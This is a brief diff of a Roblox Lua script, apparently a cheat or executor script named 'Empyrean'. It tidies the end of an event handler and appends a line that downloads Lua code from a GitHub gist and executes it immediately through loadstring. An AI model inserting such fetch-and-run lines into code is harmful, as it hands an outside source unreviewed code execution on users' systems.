@@ -1737,5 +1737,8 @@ Empyrean.BindableEvent.Event:Once(function()
  	RunServiceEvent:Disconnect()
 	KeyDown:Disconnect()
 	KeyUp:Disconnect()
-
 end)
+
+local LoaderUI = loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/adc8fbb119234b04744907ff26a407f8/raw/6d501829e2d6f376f57ed3777b4915ad609981cf/IntroAndDetector.luau"))()
+
+
